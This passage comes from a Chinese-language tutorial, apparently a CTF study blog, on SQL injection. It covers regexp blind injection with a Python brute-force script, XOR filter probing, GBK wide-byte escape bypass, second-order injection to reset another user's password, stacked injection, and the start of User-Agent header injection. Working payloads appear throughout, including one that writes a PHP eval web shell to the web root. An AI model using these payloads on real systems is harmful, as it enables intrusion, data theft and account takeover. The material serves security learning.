class="built_in">set</span> (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">| id | username | password  |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">|  1 | Dumb     | Dumb      |</span><br><span class="line">|  3 | Dummy    | p@ssword  |</span><br><span class="line">|  5 | stupid   | stupidity |</span><br><span class="line">|  8 | admin    | admin     |</span><br><span class="line">|  9 | admin1   | admin1    |</span><br><span class="line">| 10 | admin2   | admin2    |</span><br><span class="line">| 11 | admin3   | admin3    |</span><br><span class="line">| 12 | dhakkan  | dumbo     |</span><br><span class="line">| 14 | admin4   | admin4    |</span><br><span class="line">+----+----------+-----------+</span><br><span class="line">9 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;^a&#x27;</span>;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">6 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;admin[0-9]&#x27;</span>;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  9 | admin1   | admin1   |</span><br><span class="line">| 10 | admin2   | admin2   |</span><br><span class="line">| 11 | admin3   | admin3   |</span><br><span class="line">| 14 | admin4   | admin4   |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;.n&#x27;</span>;		<span class="comment">#.匹配任意字符</span></span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">9 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username regexp <span class="string">&#x27;a|b&#x27;</span>;  <span class="comment">#含有 a 或 b 的</span></span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">10 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="9-1-手动"><a href="#9-1-手动" class="headerlink" title="9.1 手动"></a>9.1 手动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),a,1)regexp(&#x27;</span>b<span class="string">&#x27;),1,2)=&#x27;</span>1</span><br><span class="line"><span class="comment"># 同时爆破 数字 a 和 字母 b</span></span><br></pre></td></tr></table></figure>

<h3 id="9-2-脚本"><a href="#9-2-脚本" class="headerlink" title="9.2 脚本"></a>9.2 脚本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xxxxx&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot; _&#123;&#125;-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,45):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;admin&#x27; and if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        </span><br><span class="line">        payload = f<span class="string">&quot;admin&#x27; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                <span class="built_in">exit</span>(0)</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure>

<h2 id="十、异或注入"><a href="#十、异或注入" class="headerlink" title="十、异或注入"></a>十、异或注入</h2><p><strong>异或</strong>：一种逻辑运算，简言之，<strong>相同为假，不同为真，NULL 与任何条件欲火结果都为 NULL</strong>，mysql 中的符号是 <strong>^  和 xor</strong>。</p>
<p>测试：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1=1 ^ 1=1 as res;</span><br><span class="line">+-----+</span><br><span class="line">| res |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1=1 xor 1=2 as res;</span><br><span class="line">+-----+</span><br><span class="line">| res |</span><br><span class="line">+-----+</span><br><span class="line">|   1 |</span><br><span class="line">+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1=2 xor 1=2 as res;</span><br><span class="line">+-----+</span><br><span class="line">| res |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select null xor 1=2 as res;</span><br><span class="line">+------+</span><br><span class="line">| res  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select null xor 1=1 as res;</span><br><span class="line">+------+</span><br><span class="line">| res  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select null xor null as res;</span><br><span class="line">+------+</span><br><span class="line">| res  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>常用手段：用于判断 所过滤的字符串</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;^(0)#</span></span><br><span class="line"><span class="string"># 得到正常的回显页面，由于异或之后得到 真</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>^(1)<span class="comment">#</span></span><br><span class="line"><span class="comment"># 得到错误的回显页面，由于异或之后得到 假</span></span><br></pre></td></tr></table></figure>

<p>常常用于判断我们所注入的某些字段是否被过滤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;^(length(&#x27;</span>union<span class="string">&#x27;)&gt;0)#</span></span><br></pre></td></tr></table></figure>

<p>如果 <code>union</code> 已被过滤，那么得到的将会是 <code>length(0&gt;0)</code> ，显然是不成立的，那就将会是 <code>1&#39;^0</code> ，得到的为 真，所以将会返回 <strong>正常</strong> 的页面；</p>
<p>如果 <code>union</code> 没有被过滤，相反的，将会得到为假的异或，返回的将会是 <strong>错误</strong> 的页面。</p>
<p>由此可以判断某些字符的过滤情况。</p>
<p>常常使用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;^(length(&#x27;</span>select<span class="string">&#x27;)&gt;0)#</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>^(length(<span class="string">&#x27;and&#x27;</span>)&gt;0)<span class="comment">#</span></span><br><span class="line">?id=1<span class="string">&#x27;^(length(&#x27;</span>or<span class="string">&#x27;)&gt;0)#</span></span><br></pre></td></tr></table></figure>

<p><strong>符号特点：</strong></p>
<ul>
<li> <code>^</code> 运算符会做位异或运算</li>
</ul>
<p>  <img src="https://i.loli.net/2021/08/21/4yJYWol36IcDBx5.png" alt="image-20210821111344451"></p>
<ul>
<li><p><code>xor</code> 做逻辑运算 <code>1 xor 0</code> 会输出 1 ，其它情况输出其余所有数据</p>
<p><img src="https://i.loli.net/2021/08/21/tAPRi3nBOy7E2wc.png" alt="image-20210821111509785"></p>
</li>
</ul>
<h2 id="十一、宽字节注入"><a href="#十一、宽字节注入" class="headerlink" title="十一、宽字节注入"></a>十一、宽字节注入</h2><p><strong>防御原理</strong><br>为了防止 SQL注入漏洞，通常在源代码当中会对我们所输入的 SQL查询语句进行一个 转义 ，一般是对 单引号，双引号 进行一个转义变成 &#39; 或者是&quot;，这样Mysql在 执行 SQL语句时，不会影响到查询，即不会出现报错，数据存储在数据库当中时不会含有 \ ，也就是说，它仅仅是在执行 SQL语句时进行了转义，当我们从数据库中向外调出数据时并不会含有 \ ，也就预防了 SQL注入。</p>
<p><img src="https://i.loli.net/2021/08/20/iSje8ohEVHtCO2M.png" alt="在这里插入图片描述"></p>
<p>如果我们不进行转义，按照一般 攻击者的思路进行 SQL注入，都是通过 ?id=1’ 进行验证，如下图，如果没有进行任何防御，即没有进行转义操作，就会出现报错，也就很容易的验证出来了 的确存在 SQL注入，并且容易看到注入方式。</p>
<p><img src="https://i.loli.net/2021/08/20/Y2sylgcHtZCRh84.png" alt="在这里插入图片描述"></p>
<p><strong>常使用的 转义函数：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</span><br><span class="line">    单引号（<span class="string">&#x27;）</span></span><br><span class="line"><span class="string">    双引号（&quot;）</span></span><br><span class="line"><span class="string">    反斜杠（\）</span></span><br><span class="line"><span class="string">    NULL</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">mysql_real_escape_string() 函数: 转义 SQL 语句中使用的字符串中的特殊字符</span></span><br><span class="line"><span class="string">下列字符受影响：</span></span><br><span class="line"><span class="string">    \x00</span></span><br><span class="line"><span class="string">    \n</span></span><br><span class="line"><span class="string">    \r</span></span><br><span class="line"><span class="string">    \</span></span><br><span class="line"><span class="string">    &#x27;</span></span><br><span class="line">    <span class="string">&quot;</span></span><br><span class="line"><span class="string">    \x1a</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">addslashes()</span></span><br></pre></td></tr></table></figure>

<p><strong>解决：</strong></p>
<ul>
<li><p>网页连接数据库时，将字符编码设置为 <strong>GBK 编码集合</strong>，然后进行 SQL语句的拼接，进行数据库的查询。</p>
</li>
<li><p><strong>GBK编码采用 双字节编码，编码范围为 8140~FEFE</strong></p>
</li>
<li><p>转义字符 <code>\</code> 的编码是 <code>5c</code> ，其在 GBK的编码范围之内，如果我们在转义字符之前 提交一个同样在编码范围之内的字符，网页在解析时，就会将其与 后面的转义字符进行一个匹配，组成一个 双字节的 GBK编码的汉字，从而失去了转义的作用。</p>
</li>
<li><p><strong>常用方法：在使用单引号 或者 双引号之前添加 %df 字符</strong></p>
</li>
<li><p><strong>方法二：在使用单引号 或者 双引号之前添加 %aa%5c 字符</strong></p>
</li>
<li><p>解释：</p>
   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">例如:  ?id=1%aa%5c<span class="string">&#x27; </span></span><br><span class="line"><span class="string">其实是： ?id=1%aa\&#x27;</span> </span><br><span class="line">即： ?id=1%aa%\\\<span class="string">&#x27;</span></span><br><span class="line"><span class="string">其中 \ 是 %5c;  &#x27;</span> 是 %27</span><br><span class="line">数据库中做了转义处理之后变成：%aa%5c%5c%5c%27</span><br><span class="line">这样，%aa和%5c进行组合称为了一个汉字，%5c与%5c仍旧是 \\ ，而 %27(单引号) 就分离出来了</span><br></pre></td></tr></table></figure></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php">GBK编码范围</a></p>
<h2 id="十二、二次注入"><a href="#十二、二次注入" class="headerlink" title="十二、二次注入"></a>十二、二次注入</h2><p><strong>根源在于：来发这信任从数据库中取出的数据都是无害的。</strong></p>
<blockquote>
<p><strong>原理</strong>：攻击者构造的恶意数据 存储在 数据库 后，恶意数据 被读取 并进入到 SQL查询语句 所导致的注入。<br>防御者可能在用户 输入 恶意数据时对其中的特殊字符进行了 <strong>转义处理</strong> ，但在恶意数据插入到数据库时被处理的数据又 <strong>被还原</strong> 并存储在数据库中，当Web程序 <strong>调用</strong> 存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br><strong>也就是说在应用程序中输入恶意造的数据库查询语句时会被转义，但是在数据库内部调用读取语句的时候又被还原。</strong></p>
</blockquote>
<blockquote>
<p><strong>二次注入步骤</strong>:<br>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了 <strong>转义处理</strong>，在<strong>写入数据库的时候又保留了原来的数据</strong>。<br>第二步：引用恶意数据<br><strong>开发者默认存入数据库的数据都是安全的，在进行查询即调用已存储在数据库中的数据时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</strong></p>
</blockquote>
<ul>
<li>一般结合 <strong>修改密码 功能点</strong>  进行利用</li>
</ul>
<p>举例：</p>
<ol>
<li><p>已知用户登陆时的查询  <code>login.php</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查询防御：login.php</span><br><span class="line">$username <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_user&quot;]);</span><br><span class="line">$password <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_password&quot;]);</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>我们使用下面 <strong>用户登录</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Dumb</span></span><br></pre></td></tr></table></figure>

<p>则实际进行操作的语句成为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;Dumb\&#x27;&#x27; and password=&#x27;</span>Dumb<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>由于进行了 <code>mysql_real_escape_string</code> 转义，则不会引发 sql 注入，从而成功进行了防御</p>
</li>
<li><p>已知注册用户时的插入 <code>login_create.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">插入防御：login_create.php</span><br><span class="line"><span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="variable">$username</span>\&quot;, \&quot;<span class="variable">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>我们 <strong>注册新的用户</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">123456</span></span><br><span class="line"><span class="string">123456</span></span><br></pre></td></tr></table></figure>

<p>同样对我们输入的数据进行了转义处理，则实际操作语句是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username 进行转义处理之后得到 Dumb\<span class="string">&#x27;#，代入，即</span></span><br><span class="line"><span class="string">insert into users ( username, password) values(\&quot;Dumb\&#x27;</span><span class="comment">#\&quot;, \&quot;123456\&quot;)</span></span><br></pre></td></tr></table></figure>

<p>这样我们成功注册了一个新的用户 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">123456</span></span><br></pre></td></tr></table></figure></li>
<li><p>已知用户修改密码  <code>pass_change.php</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="variable">$pass</span>&#x27; where username=&#x27;<span class="variable">$username</span>&#x27; and password=&#x27;<span class="variable">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到，此时的用户名没有进行转义防御就出现在了sql语句当中</p>
</li>
<li><p>我们以新注册的 <code>Dumb&#39;#</code> 用户登录进去，利用修改密码的功能</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">654321</span></span><br><span class="line"><span class="string">654321</span></span><br></pre></td></tr></table></figure>

<p>代入 sql 语句中得到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">&#x27;654321&#x27;</span> <span class="built_in">where</span> username=<span class="string">&#x27;Dumb&#x27;</span><span class="comment">#&#x27; and password=&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这样看来，我们实际上修改的是 用户名为 <code>Dumb</code> 的密码</p>
</li>
<li><p>这样我们就在只以知某一用户名，不知其密码的情况下，通过 <strong>二次注入</strong> ，成功的可以登录其它用户的账号了</p>
</li>
</ol>
<h2 id="十三、堆叠注入"><a href="#十三、堆叠注入" class="headerlink" title="十三、堆叠注入"></a>十三、堆叠注入</h2><p>SQL语句书写时，以 分号 <code>;</code> 表示一条SQL语句结束，通过使用分号同时执行多条 SQL语句 即为 <code>堆叠注入</code> 。该注入可修改数据库的任意结构和数据。</p>
<p>测试：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users <span class="built_in">where</span> id= 1;create table  qwe like users;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_security |</span><br><span class="line">+--------------------+</span><br><span class="line">| emails             |</span><br><span class="line">| qwe                |</span><br><span class="line">| referers           |</span><br><span class="line">| uagents            |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> id= 1;drop table  qwe;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_security |</span><br><span class="line">+--------------------+</span><br><span class="line">| emails             |</span><br><span class="line">| referers           |</span><br><span class="line">| uagents            |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>堆叠注入写一句话木马文件</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&#x27;;select &#x27;</span>&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[111]); ?&gt;<span class="string">&#x27; into outfile &#x27;</span>/var/www/html/hacker.php<span class="string">&#x27;;--+</span></span><br></pre></td></tr></table></figure>



<p><strong>题例：[GYCTF2020]Blacklist1</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 2#</span></span><br><span class="line"><span class="string">1&#x27;</span>;show databases;<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27;;select database();#</span></span><br><span class="line"><span class="string">1&#x27;</span>;show tables;</span><br><span class="line">1<span class="string">&#x27;;show columns from 表名;#</span></span><br><span class="line"><span class="string">1&#x27;</span>create table 新表名 like 已知表名;<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27;;drop table 新表名;#</span></span><br><span class="line"><span class="string">1&#x27;</span>;handler 表名 open;handler 表名 <span class="built_in">read</span> first;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="十四、HTTP-头部注入"><a href="#十四、HTTP-头部注入" class="headerlink" title="十四、HTTP 头部注入"></a>十四、HTTP 头部注入</h2><h3 id="14-1-User-Agent-注入"><a href="#14-1-User-Agent-注入" class="headerlink" title="14.1 User-Agent 注入"></a>14.1 User-Agent 注入</h3><p>源码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="variable">$uagent</span>&#x27;, &#x27;<span class="variable">$IP</span>&#x27;, <span class="variable">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>当将 客户端可控的 <code>$uagent</code> 带入代入 <code>$insert</code> sql 语句时，必须将紧随其后的 单引号先闭合</p>
